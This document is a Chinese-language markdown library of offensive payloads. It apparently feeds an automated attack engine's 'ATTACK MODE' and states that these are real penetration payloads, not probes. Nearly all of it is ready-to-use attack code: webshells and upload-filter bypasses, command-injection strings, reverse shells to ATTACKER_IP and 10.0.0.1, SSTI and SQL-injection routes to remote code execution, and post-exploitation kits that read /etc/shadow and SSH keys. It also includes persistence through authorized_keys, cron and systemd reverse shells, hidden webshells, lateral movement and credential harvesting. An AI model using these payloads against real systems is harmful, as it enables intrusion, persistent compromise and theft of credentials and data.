# 主动攻击载荷库 (Active Attack Payloads)

## 文件用途

attack_engine.py 和 active_explorer.py 在 ATTACK MODE 下使用的真实攻击载荷。
**不是安全探测 — 这是真实的渗透攻击负载。**

---

## 一、Webshell 部署矩阵

### 按目标语言选择 Webshell

| 目标环境 | 推荐 Webshell | 文件 | 连接方式 |
|---------|-------------|------|---------|
| PHP + Apache/Nginx | PHP 一句话 | `simple.php` | POST cmd=system('id'); |
| PHP (需文件管理) | PHP File Manager | `filemanager.php` | POST pass=xxx&a=cmd&c=id |
| PHP (需反弹) | PHP Reverse Shell | `reverse.php` | POST ip=&port= |
| PHP (免杀) | 冰蝎兼容 | `ice.php` | 冰蝎客户端 AES加密 |
| Java/Tomcat | JSP CMD | `cmd.jsp` | GET ?cmd=id |
| Java (免杀) | 哥斯拉JSP | `godzilla.jsp` | 哥斯拉客户端 AES加密 |
| Java (免杀) | 冰蝎JSP | `behinder.jsp` | 冰蝎客户端 |
| .NET/IIS | ASPX CMD | `cmd.aspx` | GET ?cmd=whoami |
| .NET (需文件管理) | ASPX File Manager | `filemanager.aspx` | 浏览器直接访问 |
| Python CGI | Python CGI | `cmd.py` | GET ?cmd=id |
| Tomcat WAR部署 | WAR Auto-Deploy | `shell.war` | 上传到webapps/后自动部署 |

### 上传绕过技巧

```
# 扩展名绕过
shell.php → shell.php5, shell.phtml, shell.pht, shell.shtml, shell.php.
shell.php → shell.PHP, shell.Php (大小写)
shell.php → shell.php%00.jpg (null字节)
shell.php → shell.php.jpg (双扩展名)

# Content-Type绕过
application/x-php → image/jpeg, image/png, image/gif, text/plain

# 内容验证绕过
添加图片头: GIF89a; <?php @eval($_POST['cmd']);?>
PHP标签变体: <?php → <?= → <% → <script language="php">

# .htaccess 配合
上传.htaccess: AddType application/x-httpd-php .jpg
上传shell.jpg: <?php @eval($_POST['cmd']);?>
```

---

## 二、命令注入 → RCE 载荷

### 命令注入探测顺序

```
1. 基本注入
   ;whoami
   |whoami
   &&whoami
   ||whoami
   `whoami`
   $(whoami)
   %0awhoami

2. 信息收集
   ;id
   ;uname -a
   ;hostname
   ;ifconfig
   ;netstat -tlnp
   ;ps aux
   ;cat /etc/passwd
   ;ls -la /
   ;env

3. 反弹Shell
   ;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
   ;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
   ;php -r '$s=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
   ;perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

4. 写Webshell
   ;echo '<?php @eval($_POST[x]);?>' > /var/www/html/x.php
   ;echo 'PCVAZXZhbChSZXF1ZXN0LmdldFBhcmFtZXRlcigieCIpKTsgJT4=' | base64 -d > /var/www/html/x.jsp
```

### Windows 命令注入

```
;whoami
;ipconfig /all
;netstat -ano
;net user
;net localgroup administrators
;systeminfo
;tasklist
;dir C:\
;type C:\Windows\win.ini

# 反弹Shell (PowerShell)
;powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1|Out-String;$x=([Text.Encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($x,0,$x.Length)}$c.Close()"

# 写Webshell
;echo ^<%@ Page Language="C#" %^>^<script runat="server"^>protected void Page_Load(object sender,EventArgs e){System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]);}^</script^> > C:\inetpub\wwwroot\shell.aspx
```

---

## 三、SSTI → RCE 载荷

### 完整利用链

```
Jinja2 (Python Flask):
  探测: {{7*7}} → 49
  信息: {{config}} → Flask配置
  RCE:  {{cycler.__init__.__globals__.os.popen('id').read()}}
  Shell: {{cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"').read()}}

Twig (PHP):
  探测: {{7*7}} → 49
  RCE:  {{_self.env.registerUndefinedFilterCallback('exec')}}{{['id']|filter('exec')}}
  Shell: {{_self.env.registerUndefinedFilterCallback('system')}}{{['bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"']|filter('system')}}

Freemarker (Java):
  探测: ${7*7} → 49
  RCE:  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
  JAVA RCE: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("python3 -c 'import socket..."')}

Velocity (Java):
  探测: #set($x=7*7)$x → 49
  RCE:  #set($r=Runtime.getRuntime())#set($p=$r.exec("id"))#set($i=$p.getInputStream())#set($s=new java.util.Scanner($i).useDelimiter("\\A"))$s.next()

Thymeleaf (Java/Spring):
  探测: __${7*7}__::.x → 49
  RCE:  __${T(java.lang.Runtime).getRuntime().exec("id")}__::.x

Smarty (PHP):
  探测: {7*7} → 49
  RCE:  {system('id')}
  
ERB (Ruby):
  探测: <%= 7*7 %> → 49
  RCE:  <%= system('id') %>

Jade/Pug (Node.js):
  探测: #{7*7} → 49
  RCE:  #{global.process.mainModule.require('child_process').execSync('id')}
```

---

## 四、SQL注入 → RCE 载荷

### MySQL → Webshell / UDF

```
1. 信息收集
   SELECT @@version          → 版本
   SELECT user()             → 当前用户
   SELECT database()         → 当前数据库
   SELECT @@plugin_dir       → plugin目录
   SELECT @@secure_file_priv → 文件写入限制
   SELECT @@datadir          → 数据目录

2. INTO OUTFILE (需要 secure_file_priv='')
   SELECT '<?php @eval($_POST[x]);?>' INTO OUTFILE '/var/www/html/shell.php'
   SELECT '<?=@eval($_POST[x]);?>' INTO OUTFILE '/var/www/html/s.png' (配合.htaccess)
   SELECT 0x3C3F706870... INTO DUMPFILE '/var/www/html/s.php' (HEX写入)

3. UDF 提权 (需要 plugin_dir 可写)
   SELECT 0x7F454C46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'
   CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so'
   SELECT sys_exec('chmod u+s /bin/bash')

4. 日志写Webshell (需要 root)
   SET GLOBAL general_log = 'ON'
   SET GLOBAL general_log_file = '/var/www/html/log.php'
   SELECT '<?php @eval($_POST[x]);?>'
   SET GLOBAL general_log = 'OFF'
```

### MSSQL → xp_cmdshell

```
1. 信息收集
   SELECT @@version
   SELECT IS_SRVROLEMEMBER('sysadmin')
   SELECT SYSTEM_USER

2. 启用 xp_cmdshell
   EXEC sp_configure 'show advanced options', 1; RECONFIGURE
   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE

3. 执行命令
   EXEC xp_cmdshell 'whoami'
   EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "..."'
   
4. 写Webshell
   EXEC xp_cmdshell 'echo ^<%@ Page... > C:\inetpub\wwwroot\shell.aspx'
```

### PostgreSQL → COPY PROGRAM

```
1. 信息收集
   SELECT version()
   SELECT current_user

2. RCE
   COPY (SELECT '') TO PROGRAM 'id'
   COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'
```

---

## 五、Webshell 命令速查 (通过webshell执行)

### 信息收集套件
```
whoami; id; hostname; uname -a
ifconfig 2>/dev/null || ip addr
netstat -tlnp
ps aux
cat /etc/passwd; cat /etc/shadow 2>/dev/null
cat /etc/hosts
cat /etc/crontab; ls -la /etc/cron.*
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null | head -30
env | grep -iE "pass|secret|key|token|db|mysql|mongo|redis"
cat ~/.bash_history | tail -50
ls -la ~/.ssh/
cat ~/.ssh/id_rsa 2>/dev/null
```

### 持久化套件
```
# SSH Key
mkdir -p ~/.ssh && echo "ATTACKER_PUBKEY" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys

# Cron反弹 (每5分钟)
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'") | crontab -

# Webshell种子 (多路径)
echo '<?php @eval($_POST[x]);?>' > /var/www/html/.cache.php
echo '<?php @eval($_POST[x]);?>' > /var/www/html/images/logo.php
echo '<?php @eval($_POST[x]);?>' > /tmp/.sess_php
echo '<?php @eval($_POST[x]);?>' > /dev/shm/.shm.php

# systemd服务
echo '[Unit]\nDescription=Sys\n[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/sys-service.service
systemctl daemon-reload && systemctl enable sys-service && systemctl start sys-service
```

### 横向移动套件
```
# ARP扫描内网
arp -a
cat /proc/net/arp

# SSH横向
for host in $(cat /etc/hosts | awk '{print $2}'); do ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $host 'whoami; hostname' 2>/dev/null; done

# 凭据提取
grep -r "password" /var/www/html/ --include="*.php" --include="*.env" --include="*.conf" 2>/dev/null | head -20
grep -r "jdbc:" /opt/ /var/ 2>/dev/null | head -10
cat /root/.bash_history 2>/dev/null | grep -iE "ssh|mysql -u|psql|mongo|redis-cli -a" | head -20
```
